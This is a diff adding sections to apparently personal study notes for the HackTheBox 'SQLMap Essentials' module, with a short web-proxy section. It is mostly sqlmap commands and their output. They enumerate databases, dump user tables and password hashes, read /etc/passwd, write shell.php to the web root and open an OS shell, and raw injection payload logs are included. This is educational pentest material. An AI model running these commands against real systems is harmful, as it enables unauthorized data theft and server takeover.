+**Original note sections:** [SQLMap Essentials — HTB Module — DB Schema Enumeration](/web/htb/sqlmap-essentials#db-schema-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="DB Users Password Enumeration and Cracking">
+
+### DB Users Password Enumeration and Cracking
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
+
+...SNIP...
+[14:25:20] [INFO] fetching database users password hashes
+[14:25:20] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+[14:25:20] [INFO] retrieved: 'root'
+[14:25:20] [INFO] retrieved: 'root'
+[14:25:20] [INFO] retrieved: 'root'
+[14:25:20] [INFO] retrieved: 'debian-sys-maint'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — DB Users Password Enumeration and Cracking](/web/htb/sqlmap-essentials#db-users-password-enumeration-and-cracking)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Full HTTP Requests">
+
+### Full HTTP Requests
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -r req.txt
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.4.9}
+|_ -| . [(]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 14:32:59 /2020-09-11/
+
+[14:32:59] [INFO] parsing HTTP request from 'req.txt'
+[14:32:59] [INFO] testing connection to the target URL
+[14:32:59] [INFO] testing if the target URL content is stable
+[14:33:00] [INFO] target URL content is stable
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Full HTTP Requests](/web/htb/sqlmap-essentials#full-http-requests)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="GET/POST Requests">
+
+### GET/POST Requests
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — GET/POST Requests](/web/htb/sqlmap-essentials#get/post-requests)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — GET/POST Requests](/web/htb/sqlmap-essentials#get/post-requests)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Getting Started with SQLMap">
+
+### Getting Started with SQLMap
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -h
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.9#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+Usage: python3 sqlmap [options]
+
+Options:
+  -h, --help            Show basic help message and exit
+  -hh                   Show advanced help message and exit
+  --version             Show program's version number and exit
+  -v VERBOSE            Verbosity level: 0-6 (default 1)
+
+  Target:
+    At least one of these options has to be provided to define the
+    target(s)
+
+    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
+    -g GOOGLEDORK       Process Google dork results as target URLs
+...SNIP...
+
+    Advanced Listing shows all options and switches (switch -hh):
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Getting Started with SQLMap](/web/htb/sqlmap-essentials#getting-started-with-sqlmap)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -hh
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.4.9#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+Usage: python3 sqlmap [options]
+
+Options:
+  -h, --help            Show basic help message and exit
+  -hh                   Show advanced help message and exit
+  --version             Show program's version number and exit
+  -v VERBOSE            Verbosity level: 0-6 (default 1)
+
+  Target:
+    At least one of these options has to be provided to define the
+    target(s)
+
+    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
+    -d DIRECT           Connection string for direct database connection
+    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
+    -m BULKFILE         Scan multiple targets given in a textual file
+    -r REQUESTFILE      Load HTTP request from a file
+    -g GOOGLEDORK       Process Google dork results as target URLs
+    -c CONFIGFILE       Load options from a configuration INI file
+
+  Request:
+    These options can be used to specify how to connect to the target URL
+
+    -A AGENT, --user..  HTTP User-Agent header value
+    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
+    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
+    --data=DATA         Data string to be sent through POST (e.g. "id=1")
+    --param-del=PARA..  Character used for splitting parameter values (e.g. &)
+    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
+    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
+...SNIP...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Getting Started with SQLMap](/web/htb/sqlmap-essentials#getting-started-with-sqlmap)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Level/Risk">
+
+### Level/Risk
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
+
+...SNIP...
+[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
+[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
+...SNIP...
+[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
+[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
+[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
+...SNIP...
+[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
+[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
+[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
+...SNIP...
+[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
+[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
+[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Level/Risk](/web/htb/sqlmap-essentials#level/risk)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
+...SNIP...
+[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
+[14:20:36] [PAYLOAD] 1 AND 7496=4313
+[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
+[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
+[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
+[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Level/Risk](/web/htb/sqlmap-essentials#level/risk)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u www.example.com/?id=1
+...SNIP...
+[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[14:42:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+...SNIP...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Level/Risk](/web/htb/sqlmap-essentials#level/risk)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3
+
+...SNIP...
+[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+...SNIP...
+[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
+[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+...SNIP...
+[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
+...SNIP...
+[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
+[14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+...SNIP...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Level/Risk](/web/htb/sqlmap-essentials#level/risk)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="OS Command Execution">
+
+### OS Command Execution
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell
+
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.4.11#stable}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[*] starting @ 18:02:15 /2020-11-19/
+
+[18:02:16] [INFO] resuming back-end DBMS 'mysql'
+[18:02:16] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+[18:02:37] [INFO] the local file '/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so' and the remote file './libslpjs.so' have the same size (8040 B)
+[18:02:37] [INFO] creating UDF 'sys_exec' from the binary UDF file
+[18:02:38] [INFO] creating UDF 'sys_eval' from the binary UDF file
+[18:02:39] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
+[18:02:39] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
+
+os-shell> ls -la
+do you want to retrieve the command standard output? [Y/n/a] a
+
+[18:02:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+No output
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — OS Command Execution](/web/htb/sqlmap-essentials#os-command-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
+
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.11#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 18:05:59 /2020-11-19/
+
+[18:05:59] [INFO] resuming back-end DBMS 'mysql'
+[18:05:59] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+which web application language does the web server support?
+[1] ASP
+[2] ASPX
+[3] JSP
+[4] PHP (default)
+> 4
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — OS Command Execution](/web/htb/sqlmap-essentials#os-command-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Password Enumeration and Cracking">
+
+### Password Enumeration and Cracking
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
+
+...SNIP...
+[14:31:41] [INFO] fetching columns for table 'users' in database 'master'
+[14:31:41] [INFO] fetching entries for table 'users' in database 'master'
+[14:31:41] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Password Enumeration and Cracking](/web/htb/sqlmap-essentials#password-enumeration-and-cracking)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Prefix/Suffix">
+
+### Prefix/Suffix
+
+**SQLMap Essentials — HTB Module**
+
+```bash
+sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Prefix/Suffix](/web/htb/sqlmap-essentials#prefix/suffix)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Reading Local Files">
+
+### Reading Local Files
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
+
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.4.11#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 17:40:00 /2020-11-19/
+
+[17:40:00] [INFO] resuming back-end DBMS 'mysql'
+[17:40:00] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+[17:40:01] [INFO] fetching file: '/etc/passwd'
+[17:40:01] [WARNING] time-based comparison requires larger statistical model, please wait............................. (done)
+[17:40:07] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[17:40:07] [WARNING] unable to retrieve the content of the file '/etc/passwd', going to fall-back to simpler UNION technique
+[17:40:07] [INFO] fetching file: '/etc/passwd'
+do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] y
+
+[17:40:14] [INFO] the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B)
+files saved to [1]:
+[*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)
+
+[*] ending @ 17:40:14 /2020-11-19/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Reading Local Files](/web/htb/sqlmap-essentials#reading-local-files)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="SQLMap Installation">
+
+### SQLMap Installation
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sudo apt install sqlmap
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — SQLMap Installation](/web/htb/sqlmap-essentials#sqlmap-installation)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Searching for Data">
+
+### Searching for Data
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user
+
+...SNIP...
+[14:24:19] [INFO] searching tables LIKE 'user'
+Database: testdb
+[1 table]
++-----------------+
+| users           |
++-----------------+
+
+Database: master
+[1 table]
++-----------------+
+| users           |
++-----------------+
+
+Database: information_schema
+[1 table]
++-----------------+
+| USER_PRIVILEGES |
++-----------------+
+
+Database: mysql
+[1 table]
++-----------------+
+| user            |
++-----------------+
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Searching for Data](/web/htb/sqlmap-essentials#searching-for-data)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
+
+...SNIP...
+columns LIKE 'pass' were found in the following databases:
+Database: owasp10
+Table: accounts
+[1 column]
++----------+------+
+| Column   | Type |
++----------+------+
+| password | text |
++----------+------+
+
+Database: master
+Table: users
+[1 column]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| password | varchar(512) |
++----------+--------------+
+
+Database: mysql
+Table: user
+[1 column]
++----------+----------+
+| Column   | Type     |
++----------+----------+
+| Password | char(41) |
++----------+----------+
+
+Database: mysql
+Table: servers
+[1 column]
++----------+----------+
+| Column   | Type     |
++----------+----------+
+| Password | char(64) |
++----------+----------+
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Searching for Data](/web/htb/sqlmap-essentials#searching-for-data)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Store the Traffic">
+
+### Store the Traffic
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
+
+...SNIP...
+
+grcic550@htb[/htb]$ cat /tmp/traffic.txt
+HTTP request [#1]:
+GET /?id=1 HTTP/1.1
+Host: www.example.com
+Cache-control: no-cache
+Accept-encoding: gzip,deflate
+Accept: */*
+User-agent: sqlmap/1.4.9 (http://sqlmap.org)
+Connection: close
+
+HTTP response [#1] (200 OK):
+Date: Thu, 24 Sep 2020 14:12:50 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 914
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://www.example.com:80/?id=1
+
+<!DOCTYPE html>
+<html lang="en">
+...SNIP...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Store the Traffic](/web/htb/sqlmap-essentials#store-the-traffic)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Supported SQL Injection Types">
+
+### Supported SQL Injection Types
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -hh
+...SNIP...
+  Techniques:
+    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Supported SQL Injection Types](/web/htb/sqlmap-essentials#supported-sql-injection-types)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Table Enumeration">
+
+### Table Enumeration
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+
+...SNIP...
+[13:59:24] [INFO] fetching tables for database: 'testdb'
+Database: testdb
+[4 tables]
++---------------+
+| member        |
+| data          |
+| international |
+| users         |
++---------------+
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Table Enumeration](/web/htb/sqlmap-essentials#table-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
+
+...SNIP...
+Database: testdb
+
+Table: users
+[4 entries]
++----+--------+------------+
+| id | name   | surname    |
++----+--------+------------+
+| 1  | luther | blisset    |
+| 2  | fluffy | bunny      |
+| 3  | wu     | ming       |
+| 4  | NULL   | nameisnull |
++----+--------+------------+
+
+[14:07:18] [INFO] table 'testdb.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Table Enumeration](/web/htb/sqlmap-essentials#table-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Table/Row Enumeration">
+
+### Table/Row Enumeration
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
+
+...SNIP...
+Database: testdb
+
+Table: users
+[4 entries]
++--------+------------+
+| name   | surname    |
++--------+------------+
+| luther | blisset    |
+| fluffy | bunny      |
+| wu     | ming       |
+| NULL   | nameisnull |
++--------+------------+
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Table/Row Enumeration](/web/htb/sqlmap-essentials#table/row-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
+
+...SNIP...
+Database: testdb
+
+Table: users
+[2 entries]
++----+--------+---------+
+| id | name   | surname |
++----+--------+---------+
+| 2  | fluffy | bunny   |
+| 3  | wu     | ming    |
++----+--------+---------+
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Table/Row Enumeration](/web/htb/sqlmap-essentials#table/row-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Unique Value Bypass">
+
+### Unique Value Bypass
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
+
+URI: http://www.example.com:80/?id=1&rp=99954
+URI: http://www.example.com:80/?id=1&rp=87216
+URI: http://www.example.com:80/?id=9030&rp=36456
+URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689
+URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049
+URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Unique Value Bypass](/web/htb/sqlmap-essentials#unique-value-bypass)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Verbose Output">
+
+### Verbose Output
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.9}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 16:17:40 /2020-09-24/
+
+[16:17:40] [DEBUG] cleaning up configuration parameters
+[16:17:40] [DEBUG] setting the HTTP timeout
+[16:17:40] [DEBUG] setting the HTTP User-Agent header
+[16:17:40] [DEBUG] creating HTTP requests opener object
+[16:17:40] [DEBUG] resolving hostname 'www.example.com'
+[16:17:40] [INFO] testing connection to the target URL
+[16:17:40] [TRAFFIC OUT] HTTP request [#1]:
+GET /?id=1 HTTP/1.1
+Host: www.example.com
+Cache-control: no-cache
+Accept-encoding: gzip,deflate
+Accept: */*
+User-agent: sqlmap/1.4.9 (http://sqlmap.org)
+Connection: close
+
+[16:17:40] [DEBUG] declared web page charset 'utf-8'
+[16:17:40] [TRAFFIC IN] HTTP response [#1] (200 OK):
+Date: Thu, 24 Sep 2020 14:17:40 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 914
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://www.example.com:80/?id=1
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <title>SQLMap Essentials - Case1</title>
+</head>
+
+<body>
+...SNIP...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Verbose Output](/web/htb/sqlmap-essentials#verbose-output)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Writing Local Files">
+
+### Writing Local Files
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.11#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 17:54:18 /2020-11-19/
+
+[17:54:19] [INFO] resuming back-end DBMS 'mysql'
+[17:54:19] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] y
+
+[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
+
+[*] ending @ 17:54:28 /2020-11-19/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Writing Local Files](/web/htb/sqlmap-essentials#writing-local-files)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Configure Listener &amp; FoxyProxy">
+
+### Configure Listener & FoxyProxy
+
+**Using Web Proxies (Burp Suite & OWASP ZAP)**
+
+```bash
+# Route curl / ffuf / sqlmap through Burp (127.0.0.1:8080)
+curl -sk -x http://127.0.0.1:8080 https://TARGET_IP/
+ffuf -w WORDLIST -u http://TARGET_IP/FUZZ -x http://127.0.0.1:8080
+sqlmap -r request.txt --proxy=http://127.0.0.1:8080 --batch
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Using Web Proxies (Burp Suite & OWASP ZAP) — Configure Listener & FoxyProxy](/web/web-proxies#configure-listener-&-foxyproxy)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -175,6 +1842,10 @@ sqlmap -r request.txt --sql-shell
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -182,5 +1853,3 @@ sqlmap -r request.txt --sql-shell
 - [SQLMap](/web/sqlmap)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
